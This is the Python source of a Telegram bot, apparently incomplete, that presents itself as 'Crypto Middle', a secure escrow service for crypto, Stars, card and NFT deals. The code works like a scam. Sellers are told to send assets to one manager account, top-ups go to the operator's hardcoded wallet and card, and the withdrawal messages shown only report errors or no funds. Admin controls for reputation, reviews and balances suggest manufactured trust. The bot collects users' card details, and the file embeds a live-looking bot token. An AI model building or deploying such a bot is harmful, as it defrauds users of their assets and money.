import asyncio
import re
from aiogram import Bot, Dispatcher, F
from aiogram.types import (Message, InlineKeyboardMarkup, InlineKeyboardButton,
                           CallbackQuery, BotCommand)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command

BOT_TOKEN = "8690519608:AAFV_qszCZIyVTW2RuqELXY_kBdzBMwy3Po"
ADMIN_IDS = [174415647, 713129783, 90283607]

MANAGER_USERNAME = "@CryptoMiddleManager"
SUPPORT_USERNAME = "@CryptoMiddleSupport"
TON_ADDRESS  = "UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc"
CARD_NUMBER  = "4276 3801 2345 6789"
CARD_HOLDER  = "Александр Ф."
CARD_BANK    = "ВТБ Банк"

bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher(storage=MemoryStorage())

user_data    = {}
deals        = {}
deal_counter = [1000]

# ── helpers ──────────────────────────────────────────────────────────────────

def get_user(uid):
    if uid not in user_data:
        user_data[uid] = {
            "ton_wallet": "", "card_number": "", "card_name": "",
            "has_requisites": False,
            "balance": 0.0, "reputation": 0,
            "deals_count": 0, "reviews": [], "lang": "ru"
        }
    return user_data[uid]

def get_lang(uid):
    return get_user(uid).get("lang", "ru")

def L(uid, key, **kw):
    lang = get_lang(uid)
    t = LANGS.get(lang, LANGS["ru"]).get(key) or LANGS["ru"].get(key, key)
    return t.format(**kw) if kw else t

def gen_deal_id():
    deal_counter[0] += 1
    return f"CD{deal_counter[0]}"

username_map = {}

def reg(msg: Message):
    if msg.from_user and msg.from_user.username:
        username_map[msg.from_user.username.lower()] = msg.from_user.id

def find_uid(q: str):
    q = q.strip()
    if q.startswith("@"):
        return username_map.get(q[1:].lower())
    try:
        uid = int(q)
        return uid if uid in user_data else None
    except ValueError:
        return None

def valid_card(num: str) -> bool:
    digits = re.sub(r"[\s\-]", "", num)
    return digits.isdigit() and len(digits) == 16

def valid_ton(addr: str) -> bool:
    return bool(re.match(r"^[UE]Q[A-Za-z0-9_\-]{46}$", addr.strip()))

async def safe_del(msg):
    try:
        await msg.delete()
    except Exception:
        pass

# ── FSM ──────────────────────────────────────────────────────────────────────

class SetBanner(StatesGroup):
    waiting = State()

class AddReq(StatesGroup):
    ton       = State()
    card_num  = State()
    card_name = State()

class Deal(StatesGroup):
    partner     = State()
    description = State()
    currency    = State()
    amount      = State()

class TopUp(StatesGroup):
    amount = State()

class AdminAction(StatesGroup):
    reputation = State()
    balance    = State()
    review     = State()

# ── texts ────────────────────────────────────────────────────────────────────

_M = MANAGER_USERNAME
_S = SUPPORT_USERNAME

LANGS = {
"ru": {
"welcome": (
    "Добро пожаловать 👋\n\n"
    "<b>Crypto Middle</b> - сервис безопасных сделок.\n\n"
    "Автоматизированное исполнение.\n"
    "Быстрый вывод средств.\n\n"
    "Комиссия: <b>0%</b>\n"
    "Режим: <b>24/7</b>\n"
    f"Поддержка: <b>{_S}</b>"
),
"btn_deal":     "🔐 Создать сделку",
"btn_req":      "🧾 Реквизиты",
"btn_topup":    "💰 Пополнить баланс",
"btn_withdraw": "💸 Вывести средства",
"btn_security": "🛡 Безопасность",
"btn_support":  "📋 Поддержка",
"btn_language": "🌐 Язык",
"btn_menu":     "📱 В меню",
"btn_back":     "◀️ Назад",
"btn_cancel":   "❌ Отмена",
"btn_agree":    "📍 Подтвердить ознакомление",
"btn_paid":     "💸 Я оплатил",
"btn_manager":  "💬 Написать менеджеру",

"agreement": (
    "<b>Пользовательское соглашение</b>\n\n"
    "Для сохранности активов соблюдайте правила:\n\n"
    f"Передача активов только через: <b>{_M}</b>\n\n"
    "Прямые переводы запрещены.\n\n"
    "Вывод производится после подтверждения обеими сторонами.\n\n"
    "Нажмите кнопку для подтверждения."
),

"deal_step1": (
    "<b>Создание сделки - Шаг 1/4</b>\n\n"
    "Введите <b>@username второго участника</b>:\n\n"
    "Пример: <code>@username</code>"
),
"deal_step2": (
    "<b>Создание сделки - Шаг 2/4</b>\n\n"
    "Введите <b>суть сделки</b>\n"
    "Минимум 8 символов:"
),
"deal_step2_short": "Суть должна быть не менее 8 символов. Введите снова:",
"deal_step3": (
    "<b>Создание сделки - Шаг 3/4</b>\n\n"
    "Выберите <b>валюту оплаты</b>:"
),
"deal_step4": (
    "<b>Создание сделки - Шаг 4/4</b>\n\n"
    "Введите <b>сумму сделки</b>:"
),

"no_req_ton": (
    "Вы не добавили реквизиты.\n\n"
    "Добавьте TON-кошелек для получения оплаты."
),
"no_req_card": (
    "Вы не добавили реквизиты.\n\n"
    "Добавьте номер карты для получения оплаты."
),

"deal_created": (
    "<b>Сделка создана!</b>\n\n"
    "ID: <code>{deal_id}</code>\n"
    "Участник: <b>{partner}</b>\n"
    "Суть: {description}\n"
    "Сумма: {amount}\n"
    "Валюта: {currency}\n\n"
    "Ссылка для участника:\n"
    "<code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
    "<b>Как проходит сделка:</b>\n"
    f"1. Продавец передает актив: <b>{_M}</b>\n"
    "2. Менеджер подтверждает получение\n"
    "3. Покупатель отправляет оплату\n"
    "4. Менеджер передает актив покупателю\n\n"
    "Среднее время: <b>5-15 минут</b>\n"
    "Статус: <b>Активна</b>"
),

"deal_joined_seller": (
    "<b>По вашей сделке перешел участник!</b>\n\n"
    "ID: <code>{deal_id}</code>\n"
    "Участник: <b>{buyer}</b>\n\n"
    "<b>Условия сделки:</b>\n"
    "Суть: {description}\n"
    "Сумма: {amount} {currency}\n\n"
    f"Передайте актив менеджеру: <b>{_M}</b>\n"
    "После подтверждения покупатель отправит оплату."
),

"deal_joined_buyer": (
    "<b>Информация о сделке</b>\n\n"
    "ID: <code>{deal_id}</code>\n"
    "Суть: {description}\n"
    "Сумма: {amount}\n"
    "Валюта: {currency}\n"
    "Статус: <b>Активна</b>\n\n"
    "Дождитесь подтверждения передачи актива менеджеру.\n"
    "После этого нажмите кнопку оплаты."
),

"own_deal":       "Это ваша собственная сделка.",
"deal_not_found": "Сделка не найдена или уже завершена.",

"paid_notify_admin":  (
    "<b>Пользователь сообщил об оплате</b>\n\n"
    "Сделка: <code>{deal_id}</code>\n"
    "Пользователь: {user}\n"
    "Сумма: {amount} {currency}"
),
"paid_notify_seller": (
    "<b>Покупатель сообщил об оплате</b> по сделке <code>{deal_id}</code>\n\n"
    "Менеджер проверяет оплату."
),
"paid_confirm": (
    "Уведомление об оплате отправлено менеджеру.\n\n"
    "Ожидайте подтверждения."
),

"req_title": (
    "<b>Реквизиты</b>\n\n"
    "TON: <code>{ton}</code>\n"
    "Карта: <code>{card}</code>\n"
    "Держатель: <code>{card_name}</code>"
),
"req_ton_saved":      "TON кошелек сохранен!",
"req_card_num_saved": "Теперь введите <b>имя держателя карты</b>:",
"req_card_saved":     "Карта сохранена!",
"req_ton_invalid": (
    "Некорректный TON адрес.\n"
    "Должен начинаться с UQ или EQ и содержать 48 символов.\n\n"
    "Введите снова:"
),
"req_card_invalid": (
    "Некорректный номер карты.\n"
    "Введите 16 цифр (пробелы допускаются).\n\n"
    "Введите снова:"
),
"redo_deal":       "\n\nТеперь создайте сделку заново.",
"enter_ton":       "Введите ваш <b>TON кошелек</b>:",
"enter_card_num":  "Введите <b>номер карты</b> (16 цифр):",
"enter_card_name": "Введите <b>имя держателя карты</b>:",

"topup_title":          "<b>Пополнение баланса</b>\n\nВыберите способ:",
"topup_enter_amount":   "Введите <b>сумму пополнения</b>:",
"topup_amount_invalid": "Некорректная сумма. Введите число, например: <code>100</code>",

"topup_stars": (
    "<b>Пополнение Stars</b>\n\n"
    "Сумма: <b>{amount} Stars</b>\n\n"
    f"Отправьте Stars на: <b>{_M}</b>\n\n"
    "Перейдите в диалог и отправьте нужное количество Stars.\n"
    "После отправки нажмите кнопку ниже.\n\n"
    "Время зачисления: <b>5-15 минут</b>"
),
"topup_ton": (
    "<b>Пополнение TON</b>\n\n"
    "Сумма: <b>{amount} TON</b>\n\n"
    f"<code>{TON_ADDRESS}</code>\n\n"
    f"После отправки напишите: <b>{_S}</b>\n\n"
    "Время зачисления: <b>5-15 минут</b>"
),
"topup_card": (
    "<b>Пополнение картой</b>\n\n"
    "Сумма: <b>{amount} RUB</b>\n\n"
    f"Банк: <b>{CARD_BANK}</b>\n"
    f"Номер: <code>{CARD_NUMBER}</code>\n"
    f"Держатель: <b>{CARD_HOLDER}</b>\n\n"
    "Сохраните чек и нажмите кнопку ниже.\n\n"
    "Время зачисления: <b>5-15 минут</b>"
),
"topup_nft": (
    "<b>Пополнение NFT</b>\n\n"
    f"Передайте актив: <b>{_M}</b>\n\n"
    "После проверки будет оценка в Stars или TON.\n\n"
    "Время зачисления: <b>5-15 минут</b>"
),

"withdraw_no_funds": (
    "У вас нету средств для вывода.\n\n"
    "Пополните баланс и попробуйте снова."
),
"withdraw_error": (
    "Произошла ошибка при выводе.\n\n"
    f"Обратитесь в поддержку: {_S}"
),

"security": (
    "<b>Безопасность при передаче активов</b>\n\n"
    f"Передача только через: <b>{_M}</b>\n\n"
    "Прямые транзакции запрещены.\n"
    "Сверяйте сумму и ID сделки.\n"
    "Вывод после подтверждения обеими сторонами."
),
"lang_choose":    "<b>Выберите язык:</b>",
"lang_set":       "Язык установлен: Русский",
"invalid_username": "Введите корректный @username (должен начинаться с @):",
},

"en": {
"welcome": (
    "Welcome 👋\n\n"
    "<b>Crypto Middle</b> - secure OTC deal service.\n\n"
    "Automated deal execution.\n"
    "Fast withdrawal.\n\n"
    "Commission: <b>0%</b>\n"
    "Hours: <b>24/7</b>\n"
    f"Support: <b>{_S}</b>"
),
"btn_deal":     "🔐 Create Deal",
"btn_req":      "🧾 Requisites",
"btn_topup":    "💰 Top Up",
"btn_withdraw": "💸 Withdraw",
"btn_security": "🛡 Security",
"btn_support":  "📋 Support",
"btn_language": "🌐 Language",
"btn_menu":     "📱 Menu",
"btn_back":     "◀️ Back",
"btn_cancel":   "❌ Cancel",
"btn_agree":    "📍 Confirm Agreement",
"btn_paid":     "💸 I Paid",
"btn_manager":  "💬 Write to Manager",

"agreement": (
    "<b>User Agreement</b>\n\n"
    "To protect your assets, follow the rules:\n\n"
    f"Transfer assets only through: <b>{_M}</b>\n\n"
    "Direct transfers are prohibited.\n\n"
    "Withdrawal after both sides confirm.\n\n"
    "Press the button to confirm."
),

"deal_step1": (
    "<b>Create Deal - Step 1/4</b>\n\n"
    "Enter <b>@username of the second participant</b>:\n\n"
    "Example: <code>@username</code>"
),
"deal_step2": (
    "<b>Create Deal - Step 2/4</b>\n\n"
    "Describe the <b>deal</b>\n"
    "Minimum 8 characters:"
),
"deal_step2_short": "Description must be at least 8 characters. Try again:",
"deal_step3": (
    "<b>Create Deal - Step 3/4</b>\n\n"
    "Choose <b>payment currency</b>:"
),
"deal_step4": (
    "<b>Create Deal - Step 4/4</b>\n\n"
    "Enter the <b>deal amount</b>:"
),

"no_req_ton": (
    "You have not added requisites.\n\n"
    "Add your TON wallet to receive payment."
),
"no_req_card": (
    "You have not added requisites.\n\n"
    "Add your card number to receive payment."
),

"deal_created": (
    "<b>Deal created!</b>\n\n"
    "ID: <code>{deal_id}</code>\n"
    "Participant: <b>{partner}</b>\n"
    "Description: {description}\n"
    "Amount: {amount}\n"
    "Currency: {currency}\n\n"
    "Participant link:\n"
    "<code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
    "<b>How the deal works:</b>\n"
    f"1. Seller transfers asset to: <b>{_M}</b>\n"
    "2. Manager confirms receipt\n"
    "3. Buyer sends payment\n"
    "4. Manager transfers asset to buyer\n\n"
    "Average time: <b>5-15 minutes</b>\n"
    "Status: <b>Active</b>"
),

"deal_joined_seller": (
    "<b>A participant joined your deal!</b>\n\n"
    "ID: <code>{deal_id}</code>\n"
    "Participant: <b>{buyer}</b>\n\n"
    "<b>Deal terms:</b>\n"
    "Description: {description}\n"
    "Amount: {amount} {currency}\n\n"
    f"Transfer the asset to manager: <b>{_M}</b>\n"
    "After confirmation, the buyer will send payment."
),

"deal_joined_buyer": (
    "<b>Deal Information</b>\n\n"
    "ID: <code>{deal_id}</code>\n"
    "Description: {description}\n"
    "Amount: {amount}\n"
    "Currency: {currency}\n"
    "Status: <b>Active</b>\n\n"
    "Wait for confirmation that the asset was transferred.\n"
    "Then press the payment button."
),

"own_deal":       "This is your own deal.",
"deal_not_found": "Deal not found or already closed.",

"paid_notify_admin": (
    "<b>User reported payment</b>\n\n"
    "Deal: <code>{deal_id}</code>\n"
    "User: {user}\n"
    "Amount: {amount} {currency}"
),
"paid_notify_seller": (
    "<b>Buyer reported payment</b> for deal <code>{deal_id}</code>\n\n"
    "Manager is verifying."
),
"paid_confirm": (
    "Payment notification sent to manager.\n\n"
    "Waiting for confirmation."
),

"req_title": (
    "<b>Requisites</b>\n\n"
    "TON: <code>{ton}</code>\n"
    "Card: <code>{card}</code>\n"
    "Holder: <code>{card_name}</code>"
),
"req_ton_saved":      "TON wallet saved!",
"req_card_num_saved": "Now enter the <b>cardholder name</b>:",
"req_card_saved":     "Card saved!",
"req_ton_invalid": (
    "Invalid TON address.\n"
    "Must start with UQ or EQ and be 48 characters.\n\n"
    "Enter again:"
),
"req_card_invalid": (
    "Invalid card number.\n"
    "Enter 16 digits (spaces allowed).\n\n"
    "Enter again:"
),
"redo_deal":       "\n\nNow create the deal again.",
"enter_ton":       "Enter your <b>TON wallet</b>:",
"enter_card_num":  "Enter your <b>card number</b> (16 digits):",
"enter_card_name": "Enter the <b>cardholder name</b>:",

"topup_title":          "<b>Top Up Balance</b>\n\nChoose method:",
"topup_enter_amount":   "Enter the <b>top-up amount</b>:",
"topup_amount_invalid": "Invalid amount. Enter a number, e.g.: <code>100</code>",

"topup_stars": (
    "<b>Top Up with Stars</b>\n\n"
    "Amount: <b>{amount} Stars</b>\n\n"
    f"Send Stars to: <b>{_M}</b>\n\n"
    "Open the chat and send the Stars.\n"
    "After sending, press the button below.\n\n"
    "Processing time: <b>5-15 minutes</b>"
),
"topup_ton": (
    "<b>Top Up with TON</b>\n\n"
    "Amount: <b>{amount} TON</b>\n\n"
    f"<code>{TON_ADDRESS}</code>\n\n"
    f"After sending, contact: <b>{_S}</b>\n\n"
    "Processing time: <b>5-15 minutes</b>"
),
"topup_card": (
    "<b>Top Up with Card</b>\n\n"
    "Amount: <b>{amount} RUB</b>\n\n"
    f"Bank: <b>{CARD_BANK}</b>\n"
    f"Number: <code>{CARD_NUMBER}</code>\n"
    f"Holder: <b>{CARD_HOLDER}</b>\n\n"
    "Save your receipt and press the button below.\n\n"
    "Processing time: <b>5-15 minutes</b>"
),
"topup_nft": (
    "<b>Top Up with NFT</b>\n\n"
    f"Transfer to: <b>{_M}</b>\n\n"
    "After verification, valuation in Stars or TON.\n\n"
    "Processing time: <b>5-15 minutes</b>"
),

"withdraw_no_funds": (
    "You have no funds to withdraw.\n\n"
    "Top up your balance first."
),
"withdraw_error": (
    "An error occurred during withdrawal.\n\n"
    f"Contact support: {_S}"
),

"security": (
    "<b>Asset Transfer Security</b>\n\n"
    f"Transfer only through: <b>{_M}</b>\n\n"
    "Direct transactions are prohibited.\n"
    "Verify the amount and deal ID.\n"
    "Withdrawal after both sides confirm."
),
"lang_choose":    "<b>Choose language:</b>",
"lang_set":       "Language set: English",
"invalid_username": "Enter a valid @username (must start with @):",
},
}

# ── keyboards ────────────────────────────────────────────────────────────────

def main_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_deal"),     callback_data="deal"),
         InlineKeyboardButton(text=L(uid,"btn_req"),      callback_data="requisites")],
        [InlineKeyboardButton(text=L(uid,"btn_topup"),    callback_data="topup"),
         InlineKeyboardButton(text=L(uid,"btn_withdraw"), callback_data="withdraw")],
        [InlineKeyboardButton(text=L(uid,"btn_security"), callback_data="security"),
         InlineKeyboardButton(text=L(uid,"btn_support"),  url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}")],
        [InlineKeyboardButton(text=L(uid,"btn_language"), callback_data="language")],
    ])

def back_kb(uid, cb="menu"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data=cb)],
    ])

def cancel_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_cancel"), callback_data="menu")],
    ])

def agreement_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_agree"), callback_data="confirm_agreement")],
        [InlineKeyboardButton(text=L(uid,"btn_back"),  callback_data="menu")],
    ])

def currency_kb(uid):
    ru = get_lang(uid) == "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON",   callback_data="deal_cur_ton"),
         InlineKeyboardButton(text="⭐️ Stars", callback_data="deal_cur_stars")],
        [InlineKeyboardButton(text="💳 Карта (RUB)" if ru else "💳 Card (RUB)",
                              callback_data="deal_cur_card"),
         InlineKeyboardButton(text="🎁 NFT",   callback_data="deal_cur_nft")],
        [InlineKeyboardButton(text=L(uid,"btn_cancel"), callback_data="menu")],
    ])

def deal_seller_kb(uid, deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_paid"),    callback_data=f"paid_{deal_id}")],
        [InlineKeyboardButton(text=L(uid,"btn_manager"), url=f"https://t.me/{MANAGER_USERNAME.lstrip('@')}")],
        [InlineKeyboardButton(text=L(uid,"btn_back"),    callback_data="menu")],
    ])

def deal_buyer_kb(uid, deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_paid"),    callback_data=f"paid_{deal_id}")],
        [InlineKeyboardButton(text=L(uid,"btn_manager"), url=f"https://t.me/{MANAGER_USERNAME.lstrip('@')}")],
        [InlineKeyboardButton(text=L(uid,"btn_back"),    callback_data="menu")],
    ])

def req_kb(uid):
    ru = get_lang(uid) == "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON",  callback_data="req_ton"),
         InlineKeyboardButton(text="💳 Карта" if ru else "💳 Card", callback_data="req_card")],
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
    ])

def add_req_kb(uid, req_type):
    ru = get_lang(uid) == "ru"
    label = "Добавить" if ru else "Add"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"+ {label}", callback_data=f"req_{req_type}_deal")],
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
    ])

def topup_kb(uid):
    ru = get_lang(uid) == "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐️ Stars", callback_data="topup_stars"),
         InlineKeyboardButton(text="💎 TON",   callback_data="topup_ton")],
        [InlineKeyboardButton(text="💳 Карта" if ru else "💳 Card", callback_data="topup_card"),
         InlineKeyboardButton(text="🎁 NFT",   callback_data="topup_nft")],
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
    ])

def topup_paid_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_paid"), callback_data="paid_topup")],
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="topup")],
    ])

def language_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="setlang_ru"),
         InlineKeyboardButton(text="🇬🇧 English",  callback_data="setlang_en")],
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Баннер",       callback_data="adm_banner"),
         InlineKeyboardButton(text="Статистика",   callback_data="adm_stats")],
        [InlineKeyboardButton(text="Пользователи", callback_data="adm_users"),
         InlineKeyboardButton(text="Репутация",    callback_data="adm_reputation")],
        [InlineKeyboardButton(text="Отзыв",        callback_data="adm_review"),
         InlineKeyboardButton(text="Баланс",       callback_data="adm_balance")],
        [InlineKeyboardButton(text="Сделки",       callback_data="adm_deals")],
    ])

# ── show menu ────────────────────────────────────────────────────────────────

async def show_menu(message: Message, uid: int):
    banner  = user_data.get("_banner")
    welcome = L(uid, "welcome")
    kb      = main_kb(uid)
    if banner:
        await message.answer_photo(photo=banner["photo_id"],
                                   caption=banner.get("caption") or welcome,
                                   parse_mode="HTML", reply_markup=kb)
    else:
        await message.answer(welcome, parse_mode="HTML", reply_markup=kb)

# ── /start ───────────────────────────────────────────────────────────────────

@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    uid = message.from_user.id
    get_user(uid)
    if message.from_user.username:
        username_map[message.from_user.username.lower()] = uid
    await state.clear()
    # сообщение /start не удаляем

    args = message.text.split()
    if len(args) > 1 and args[1].startswith("deal_"):
        deal_id = args[1].replace("deal_", "", 1)
        deal    = deals.get(deal_id)
        if not deal:
            await message.answer(L(uid, "deal_not_found"), reply_markup=main_kb(uid))
            return
        if deal["uid"] == uid:
            await message.answer(L(uid, "own_deal"), reply_markup=main_kb(uid))
            return

        buyer_name = f"@{message.from_user.username}" if message.from_user.username else f"ID:{uid}"

        # покупателю — условия
        await message.answer(
            L(uid, "deal_joined_buyer",
              deal_id=deal_id,
              description=deal["description"],
              amount=deal["amount"],
              currency=deal["currency"]),
            parse_mode="HTML",
            reply_markup=deal_buyer_kb(uid, deal_id)
        )

        # продавцу — уведомление с условиями
        seller_uid = deal["uid"]
        try:
            await bot.send_message(
                seller_uid,
                L(seller_uid, "deal_joined_seller",
                  deal_id=deal_id, buyer=buyer_name,
                  description=deal["description"],
                  amount=deal["amount"],
                  currency=deal["currency"]),
                parse_mode="HTML",
                reply_markup=deal_seller_kb(seller_uid, deal_id)
            )
        except Exception:
            pass
        return

    await show_menu(message, uid)

# ── menu ─────────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "menu")
async def cb_menu(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await state.clear()
    await safe_del(callback.message)
    await show_menu(callback.message, uid)
    await callback.answer()

# ── language ─────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "language")
async def cb_language(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"lang_choose"), parse_mode="HTML",
                                  reply_markup=language_kb())
    await callback.answer()

@dp.callback_query(F.data.startswith("setlang_"))
async def cb_setlang(callback: CallbackQuery):
    uid  = callback.from_user.id
    lang = callback.data.replace("setlang_","")
    if lang not in LANGS: lang = "ru"
    get_user(uid)["lang"] = lang
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"lang_set"), parse_mode="HTML")
    await show_menu(callback.message, uid)
    await callback.answer()

# ── security ─────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "security")
async def cb_security(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"security"), parse_mode="HTML",
                                  reply_markup=back_kb(uid))
    await callback.answer()

# ── deal flow ────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "deal")
async def cb_deal(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"agreement"), parse_mode="HTML",
                                  reply_markup=agreement_kb(uid))
    await callback.answer()

@dp.callback_query(F.data == "confirm_agreement")
async def cb_confirm(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"deal_step1"), parse_mode="HTML",
                                  reply_markup=cancel_kb(uid))
    await state.set_state(Deal.partner)
    await callback.answer()

@dp.message(Deal.partner)
async def deal_partner(message: Message, state: FSMContext):
    uid  = message.from_user.id
    reg(message)
    await safe_del(message)
    text = message.text.strip()
    if not text.startswith("@"):
        await message.answer(L(uid,"invalid_username"), parse_mode="HTML",
                             reply_markup=cancel_kb(uid))
        return
    await state.update_data(partner=text)
    await message.answer(L(uid,"deal_step2"), parse_mode="HTML",
                         reply_markup=cancel_kb(uid))
    await state.set_state(Deal.description)

@dp.message(Deal.description)
async def deal_desc(message: Message, state: FSMContext):
    uid = message.from_user.id
    reg(message)
    await safe_del(message)
    if len(message.text.strip()) < 8:
        await message.answer(L(uid,"deal_step2_short"), parse_mode="HTML",
                             reply_markup=cancel_kb(uid))
        return
    await state.update_data(description=message.text.strip())
    await message.answer(L(uid,"deal_step3"), parse_mode="HTML",
                         reply_markup=currency_kb(uid))
    await state.set_state(Deal.currency)

@dp.callback_query(F.data.startswith("deal_cur_"), Deal.currency)
async def deal_cur(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    cur_map = {
        "deal_cur_ton":   ("TON",        "ton_wallet",  "ton"),
        "deal_cur_stars": ("Stars",       None,          None),
        "deal_cur_card":  ("Card (RUB)", "card_number", "card"),
        "deal_cur_nft":   ("NFT",         None,          None),
    }
    cur_label, req_field, req_type = cur_map[callback.data]
    user = get_user(uid)

    if req_field and not user.get(req_field):
        await safe_del(callback.message)
        key = "no_req_ton" if req_type == "ton" else "no_req_card"
        await callback.message.answer(L(uid, key), parse_mode="HTML",
                                      reply_markup=add_req_kb(uid, req_type))
        await state.clear()
        await callback.answer()
        return

    await state.update_data(currency=cur_label)
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"deal_step4"), parse_mode="HTML",
                                  reply_markup=cancel_kb(uid))
    await state.set_state(Deal.amount)
    await callback.answer()

@dp.message(Deal.amount)
async def deal_amount(message: Message, state: FSMContext):
    uid  = message.from_user.id
    reg(message)
    await safe_del(message)
    data    = await state.get_data()
    deal_id = gen_deal_id()
    deals[deal_id] = {
        "uid":         uid,
        "partner":     data.get("partner", "-"),
        "description": data.get("description", "-"),
        "amount":      message.text.strip(),
        "currency":    data.get("currency", "?"),
        "status":      "active"
    }
    get_user(uid)["deals_count"] += 1

    me = await bot.get_me()
    await message.answer(
        L(uid, "deal_created",
          deal_id=deal_id,
          partner=data.get("partner","-"),
          description=data.get("description","-"),
          amount=message.text.strip(),
          currency=data.get("currency","?"),
          bot_username=me.username),
        parse_mode="HTML",
        reply_markup=deal_seller_kb(uid, deal_id)
    )

    uname = f"@{message.from_user.username}" if message.from_user.username else f"ID:{uid}"
    for adm in ADMIN_IDS:
        try:
            await bot.send_message(
                adm,
                f"<b>Новая сделка {deal_id}</b>\n\n"
                f"Создатель: {uname} (ID:{uid})\n"
                f"Партнер: {data.get('partner','-')}\n"
                f"Суть: {data.get('description','-')}\n"
                f"Сумма: {message.text.strip()} {data.get('currency','?')}",
                parse_mode="HTML"
            )
        except Exception:
            pass
    await state.clear()

# ── paid ─────────────────────────────────────────────────────────────────────

@dp.callback_query(F.data.startswith("paid_"))
async def cb_paid(callback: CallbackQuery):
    uid     = callback.from_user.id
    deal_id = callback.data.replace("paid_","")
    uname   = f"@{callback.from_user.username}" if callback.from_user.username else f"ID:{uid}"

    if deal_id == "topup":
        for adm in ADMIN_IDS:
            try:
                await bot.send_message(
                    adm,
                    f"<b>Пополнение баланса</b>\n\nПользователь: {uname} (ID:{uid})",
                    parse_mode="HTML"
                )
            except Exception:
                pass
        await callback.answer("Уведомление отправлено!", show_alert=True)
        await callback.message.answer(L(uid,"paid_confirm"), parse_mode="HTML",
                                      reply_markup=back_kb(uid))
        return

    deal = deals.get(deal_id)
    if not deal:
        await callback.answer("Сделка не найдена", show_alert=True)
        return

    for adm in ADMIN_IDS:
        try:
            await bot.send_message(
                adm,
                L(adm, "paid_notify_admin",
                  deal_id=deal_id, user=uname,
                  amount=deal.get("amount","-"),
                  currency=deal.get("currency","-")),
                parse_mode="HTML"
            )
        except Exception:
            pass

    seller_uid = deal.get("uid")
    if seller_uid and seller_uid != uid:
        try:
            await bot.send_message(
                seller_uid,
                L(seller_uid, "paid_notify_seller", deal_id=deal_id),
                parse_mode="HTML"
            )
        except Exception:
            pass

    await callback.answer("Уведомление отправлено!", show_alert=True)
    await callback.message.answer(L(uid,"paid_confirm"), parse_mode="HTML",
                                  reply_markup=back_kb(uid))

# ── requisites ───────────────────────────────────────────────────────────────

@dp.callback_query(F.data.startswith("req_") & F.data.endswith("_deal"))
async def req_from_deal(callback: CallbackQuery, state: FSMContext):
    uid      = callback.from_user.id
    req_type = callback.data[4:-5]   # убираем "req_" и "_deal"
    await safe_del(callback.message)
    if req_type == "ton":
        await callback.message.answer(L(uid,"enter_ton"), parse_mode="HTML",
                                      reply_markup=cancel_kb(uid))
        await state.set_state(AddReq.ton)
    elif req_type == "card":
        await callback.message.answer(L(uid,"enter_card_num"), parse_mode="HTML",
                                      reply_markup=cancel_kb(uid))
        await state.set_state(AddReq.card_num)
    await state.update_data(from_deal=True)
    await callback.answer()

@dp.callback_query(F.data == "requisites")
async def cb_req(callback: CallbackQuery):
    uid = callback.from_user.id
    u   = get_user(uid)
    await safe_del(callback.message)
    await callback.message.answer(
        L(uid, "req_title",
          ton=u.get("ton_wallet") or "-",
          card=u.get("card_number") or "-",
          card_name=u.get("card_name") or "-"),
        parse_mode="HTML",
        reply_markup=req_kb(uid)
    )
    await callback.answer()

@dp.callback_query(F.data == "req_ton")
async def cb_req_ton(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"enter_ton"), parse_mode="HTML",
                                  reply_markup=cancel_kb(uid))
    await state.set_state(AddReq.ton)
    await callback.answer()

@dp.callback_query(F.data == "req_card")
async def cb_req_card(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"enter_card_num"), parse_mode="HTML",
                                  reply_markup=cancel_kb(uid))
    await state.set_state(AddReq.card_num)
    await callback.answer()

@dp.message(AddReq.ton)
